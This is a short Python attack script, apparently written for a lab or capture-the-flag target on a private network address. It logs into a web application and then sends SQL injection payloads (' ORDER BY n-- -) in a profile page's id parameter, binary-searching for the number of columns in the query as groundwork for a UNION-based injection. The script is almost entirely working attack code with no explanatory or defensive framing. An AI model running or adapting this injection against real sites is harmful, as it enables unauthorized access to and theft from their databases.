import requests


url = "http://192.168.56.135:2009/profile.php/?id=2' ORDER BY "


def login(url):
    data = {"uname": "test", "pw": "123"}
    req = requests.post(url, data=data)
    return req


def binary_search(low, high, x, cookies):
    # Check base case
    if high > low:
        mid = (high + low) // 2
        req = requests.get(url+str(mid) + "-- -",
                           cookies=cookies)
        if(x in req.text):
            return binary_search(low, mid - 1, x, cookies)
        elif x not in req.text:
            return binary_search(mid + 1, high, x, cookies)
    elif high == low:
        return high
    else:
        # Element is not present in the array
        return -1


print(binary_search(1, 10, "column", login(
    "http://192.168.56.135:2009/login.php").cookies))
